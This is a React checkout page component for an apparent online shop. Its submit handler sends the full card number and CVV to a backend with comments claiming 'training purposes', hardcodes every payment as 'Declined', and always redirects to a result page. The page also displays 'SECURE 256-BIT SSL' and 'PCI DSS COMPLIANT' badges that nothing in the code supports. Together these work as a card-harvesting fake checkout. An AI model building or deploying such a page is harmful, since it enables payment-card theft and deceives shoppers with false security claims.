import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { CreditCard, Lock, Loader2, CheckCircle2, ShieldCheck } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";

export default function Payment() {
  const navigate = useNavigate();
  const [isProcessing, setIsProcessing] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [orderInfo, setOrderInfo] = useState<any>(null);
  const [formData, setFormData] = useState({
    cardHolderName: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    zipCode: "",
  });

  useEffect(() => {
    const order = localStorage.getItem("currentOrder");
    const shipping = localStorage.getItem("shippingInfo");
    if (!order || !shipping) {
      navigate("/");
      return;
    }
    setOrderInfo({ ...JSON.parse(order), shipping: JSON.parse(shipping) });
  }, [navigate]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);

    try {
      const response = await fetch("/api/orders", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ...orderInfo,
          payment: {
            ...formData,
            cardNumber: formData.cardNumber, // Send full card number for training purposes
            cvv: formData.cvv, // Send full CVV for training purposes
            status: "Declined"
          },
          total: calculateTotal()
        }),
      });

      const result = await response.json();
      console.log("[Payment] Order submission result:", result);

      if (!response.ok) {
        console.error("[Payment] Order submission failed:", result.error, result.details);
        setError(`Order Error: ${result.error}. ${result.details}`);
      }
    } catch (error: any) {
      console.error("Error submitting order:", error);
      setError(`Network Error: ${error.message}`);
    }

    setTimeout(() => {
      setIsProcessing(false);
      navigate("/order-result");
    }, 2500);
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value;
    if (e.target.name === "cardNumber") {
      value = value.replace(/\D/g, "").replace(/(.{4})/g, "$1 ").trim();
    }
    if (e.target.name === "expiryDate") {
      value = value.replace(/\D/g, "").replace(/(.{2})/, "$1/").substring(0, 5);
    }
    setFormData({ ...formData, [e.target.name]: value });
  };

  const getCardType = (number: string) => {
    if (number.startsWith("4")) return "visa";
    if (number.startsWith("5")) return "mastercard";
    if (number.startsWith("3")) return "amex";
    return "generic";
  };

  const calculateTotal = () => {
    if (!orderInfo) return 0;
    if (orderInfo.items) {
      return orderInfo.items.reduce((sum: number, item: any) => sum + item.price * item.quantity, 0);
    }
    return orderInfo.product.price;
  };

  if (!orderInfo) return null;

  const totalAmount = calculateTotal();

  return (
    <div className="min-h-screen bg-stone-50/50 pt-32 pb-20 px-6">
      <div className="max-w-5xl mx-auto">
        {/* Back Button and Secure Banner */}
        <div className="flex items-center justify-between mb-8">
          <button 
            onClick={() => navigate(-1)}
            className="flex items-center gap-2 text-stone-500 hover:text-stone-900 transition-colors font-medium text-sm group"
          >
            <div className="w-8 h-8 rounded-full border border-stone-200 flex items-center justify-center group-hover:border-stone-900 transition-colors">
              ←
            </div>
            Back to Shipping
          </button>
          <div className="flex items-center gap-2 px-4 py-2 bg-emerald-50 text-emerald-700 rounded-full border border-emerald-100 text-xs font-bold">
            <Lock className="w-3 h-3" />
            SECURE 256-BIT SSL ENCRYPTED
          </div>
        </div>

        {error && (
          <div className="mb-8 bg-red-50 text-red-600 p-4 rounded-xl border border-red-100 text-sm font-medium">
            {error}
          </div>
        )}

        {/* Step Indicator */}
        <div className="flex items-center justify-center mb-12 px-4">
          <div className="flex items-center w-full max-w-md justify-between">
            <div className="flex items-center gap-1.5 sm:gap-2 text-emerald-600">
              <CheckCircle2 className="w-4 h-4 sm:w-5 sm:h-5 shrink-0" />
              <span className="text-[10px] sm:text-sm font-bold">Shipping</span>
            </div>
            <div className="flex-1 h-px bg-emerald-200 mx-2 sm:mx-4"></div>
            <div className="flex items-center gap-1.5 sm:gap-2 text-stone-900">
              <div className="w-5 h-5 sm:w-6 sm:h-6 rounded-full bg-stone-900 text-white flex items-center justify-center text-[10px] sm:text-xs font-bold shrink-0">2</div>
              <span className="text-[10px] sm:text-sm font-bold">Payment</span>
            </div>
            <div className="flex-1 h-px bg-stone-200 mx-2 sm:mx-4"></div>
            <div className="flex items-center gap-1.5 sm:gap-2 text-stone-400">
              <div className="w-5 h-5 sm:w-6 sm:h-6 rounded-full bg-stone-100 flex items-center justify-center text-[10px] sm:text-xs font-bold border border-stone-200 shrink-0">3</div>
              <span className="text-[10px] sm:text-sm font-bold">Review</span>
            </div>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-12">
          <div className="lg:col-span-7 space-y-8">
            {/* Payment Header */}
            <div className="bg-white p-8 rounded-3xl border border-stone-200 shadow-sm">
              <div className="flex items-center justify-between mb-8">
                <div>
                  <h1 className="text-2xl font-bold text-stone-900">Secure Payment</h1>
                  <p className="text-stone-500 text-sm">All transactions are secure and encrypted.</p>
                  <div className="flex items-center gap-2 mt-4 flex-wrap">
                    {/* Visa */}
                    <div className="bg-white rounded-lg border border-stone-100 p-1 h-8 w-12 flex items-center justify-center shadow-sm">
                      <img 
                        src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/512px-Visa_Inc._logo.svg.png" 
                        className="h-3 w-auto object-contain" 
                        alt="VISA" 
                        referrerPolicy="no-referrer"
                        onError={(e) => {
                          (e.target as HTMLImageElement).style.display = 'none';
                          (e.target as HTMLImageElement).parentElement!.innerHTML = '<span class="text-[10px] font-bold text-[#1a1f71]">VISA</span>';
                        }}
                      />
                    </div>
                    {/* Mastercard */}
                    <div className="bg-white rounded-lg border border-stone-100 p-1 h-8 w-12 flex items-center justify-center shadow-sm">
                      <img 
                        src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1200px-Mastercard-logo.svg.png" 
                        className="h-5 w-auto object-contain" 
                        alt="Mastercard" 
                        referrerPolicy="no-referrer"
                        onError={(e) => {
                          (e.target as HTMLImageElement).style.display = 'none';
                          (e.target as HTMLImageElement).parentElement!.innerHTML = '<span class="text-[8px] font-bold text-[#eb001b]">MC</span>';
                        }}
                      />
                    </div>
                    {/* Amex */}
                    <div className="bg-white rounded-lg border border-stone-100 p-1 h-8 w-12 flex items-center justify-center shadow-sm">
                      <img 
                        src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/30/American_Express_logo.svg/1200px-American_Express_logo.svg.png" 
                        className="h-5 w-auto object-contain" 
                        alt="Amex" 
                        referrerPolicy="no-referrer"
                        onError={(e) => {
                          (e.target as HTMLImageElement).style.display = 'none';
                          (e.target as HTMLImageElement).parentElement!.innerHTML = '<span class="text-[8px] font-bold text-[#007bc1]">AMEX</span>';
                        }}
                      />
                    </div>
                  </div>
                </div>
                <ShieldCheck className="w-8 h-8 text-emerald-600" />
              </div>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="space-y-2">
                  <label className="text-xs font-bold uppercase tracking-widest text-stone-400">Cardholder Name</label>
                  <input
                    required
                    name="cardHolderName"
                    value={formData.cardHolderName}
                    onChange={handleChange}
                    className="w-full px-4 py-3.5 rounded-xl border border-stone-200 focus:ring-2 focus:ring-stone-900 outline-none transition-all placeholder:text-stone-300 font-medium"
                    placeholder="JONATHAN DOE"
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-xs font-bold uppercase tracking-widest text-stone-400">Card Number</label>
                  <div className="relative">
                    <input
                      required
                      name="cardNumber"
                      value={formData.cardNumber}
                      onChange={handleChange}
                      maxLength={19}
                      className="w-full px-4 py-3.5 rounded-xl border border-stone-200 focus:ring-2 focus:ring-stone-900 outline-none transition-all pl-12 placeholder:text-stone-300 font-mono"
                      placeholder="0000 0000 0000 0000"
                    />
                    <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 text-stone-400 w-5 h-5" />
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-2">
                    <label className="text-xs font-bold uppercase tracking-widest text-stone-400">Expiry Date</label>
                    <input
                      required
                      name="expiryDate"
                      value={formData.expiryDate}
                      onChange={handleChange}
                      placeholder="MM / YY"
                      className="w-full px-4 py-3.5 rounded-xl border border-stone-200 focus:ring-2 focus:ring-stone-900 outline-none transition-all placeholder:text-stone-300 font-medium text-center"
                    />
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <label className="text-xs font-bold uppercase tracking-widest text-stone-400">CVV</label>
                      <div className="relative">
                        <input
                          required
                          name="cvv"
                          type="password"
                          value={formData.cvv}
                          onChange={handleChange}
                          placeholder="•••"
                          maxLength={4}
                          className="w-full px-4 py-3.5 rounded-xl border border-stone-200 focus:ring-2 focus:ring-stone-900 outline-none transition-all placeholder:text-stone-300 font-medium text-center"
                        />
                        <div className="absolute right-4 top-1/2 -translate-y-1/2">
                          <div className="w-5 h-5 border-2 border-stone-200 rounded-full flex items-center justify-center text-[10px] font-bold text-stone-400 cursor-help" title="3 or 4 digit security code">?</div>
                        </div>
                      </div>
                    </div>
                    <div className="space-y-2">
                      <label className="text-xs font-bold uppercase tracking-widest text-stone-400">Zip Code</label>
                      <input
                        required
                        name="zipCode"
                        value={formData.zipCode}
                        onChange={handleChange}
                        placeholder="00000"
                        maxLength={10}
                        className="w-full px-4 py-3.5 rounded-xl border border-stone-200 focus:ring-2 focus:ring-stone-900 outline-none transition-all placeholder:text-stone-300 font-medium text-center"
                      />
                    </div>
                  </div>
                </div>

                <div className="pt-4">
                  <button
                    disabled={isProcessing}
                    className="w-full bg-stone-900 text-white py-4.5 rounded-xl font-bold flex items-center justify-center gap-3 hover:bg-stone-800 transition-all active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed shadow-xl shadow-stone-900/20"
                  >
                    {isProcessing ? (
                      <>
                        <Loader2 className="w-5 h-5 animate-spin" />
                        Processing Securely...
                      </>
                    ) : (
                      <>
                        <Lock className="w-4 h-4" />
                        Pay Now • ${totalAmount.toFixed(2)}
                      </>
                    )}
                  </button>
                </div>
              </form>
            </div>

            {/* Trust Badges */}
            <div className="flex flex-wrap items-center justify-center gap-8 opacity-60 transition-all duration-500">
              <div className="flex items-center gap-1 text-xs font-bold text-stone-900">
                <ShieldCheck className="w-4 h-4" />
                PCI DSS COMPLIANT
              </div>
            </div>
          </div>

          <div className="lg:col-span-5 space-y-8">
            <div className="bg-white p-8 rounded-3xl border border-stone-200 shadow-sm sticky top-32">
              <h2 className="text-lg font-bold text-stone-900 mb-6 flex items-center gap-2">
                Order Summary
                <span className="text-xs font-normal text-stone-400 bg-stone-100 px-2 py-0.5 rounded-full">
                  {orderInfo.items ? orderInfo.items.length : 1} Items
                </span>
              </h2>
              
              <div className="space-y-4 max-h-[320px] overflow-y-auto pr-2 custom-scrollbar mb-6">
                {orderInfo.items ? (
                  orderInfo.items.map((item: any) => (
                    <div key={item.id} className="flex gap-4 group">
                      <div className="relative overflow-hidden rounded-xl border border-stone-100">
                        <img 
                          src={item.imageUrl} 
                          alt={item.title} 
                          className="w-16 h-16 object-cover transition-transform group-hover:scale-110"
                          referrerPolicy="no-referrer"
                        />
                        <div className="absolute top-0 right-0 bg-stone-900 text-white text-[10px] px-1.5 py-0.5 rounded-bl-lg font-bold">
                          x{item.quantity}
                        </div>
                      </div>
                      <div className="flex-1 flex flex-col justify-center">
                        <h3 className="font-bold text-sm text-stone-800 line-clamp-1">{item.title}</h3>
                        <p className="font-bold text-stone-900 text-sm mt-1">${(item.price * item.quantity).toFixed(2)}</p>
                      </div>
                    </div>
                  ))
                ) : (
                  <div className="flex gap-4">
                    <img 
                      src={orderInfo.product.imageUrl} 
                      alt={orderInfo.product.title} 
                      className="w-16 h-16 object-cover rounded-xl border border-stone-100"
                      referrerPolicy="no-referrer"
                    />
                    <div className="flex-1">
                      <h3 className="font-bold text-sm text-stone-800">{orderInfo.product.title}</h3>
                      <p className="text-xs text-stone-500">Quantity: 1</p>
                      <p className="font-bold text-stone-900 text-sm mt-1">${orderInfo.product.price.toFixed(2)}</p>
                    </div>
                  </div>
                )}
              </div>

              <div className="space-y-3 pt-6 border-t border-stone-100">
                <div className="flex justify-between text-sm">
                  <span className="text-stone-500">Subtotal</span>
                  <span className="font-medium text-stone-900">
                    ${(orderInfo.items 
                      ? orderInfo.items.reduce((sum: number, item: any) => sum + item.price * item.quantity, 0)
                      : orderInfo.product.price
                    ).toFixed(2)}
                  </span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-stone-500">Shipping</span>
                  <span className="text-emerald-600 font-bold uppercase text-[10px] tracking-widest">Free</span>
                </div>
                <div className="flex justify-between text-xl font-bold pt-4 text-stone-900 border-t border-stone-50 mt-2">
                  <span>Total</span>
                  <span>
                    ${totalAmount.toFixed(2)}
                  </span>
                </div>
              </div>

              <div className="mt-8 p-4 bg-stone-50 rounded-2xl border border-stone-100">
                <h4 className="text-[10px] font-bold uppercase tracking-widest text-stone-400 mb-2">Shipping Address</h4>
                <p className="text-xs text-stone-600 leading-relaxed font-medium">
                  {orderInfo.shipping.firstName} {orderInfo.shipping.lastName}<br />
                  {orderInfo.shipping.street} {orderInfo.shipping.houseNumber}, {orderInfo.shipping.city}<br />
                  {orderInfo.shipping.postalCode}, {orderInfo.shipping.country}
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
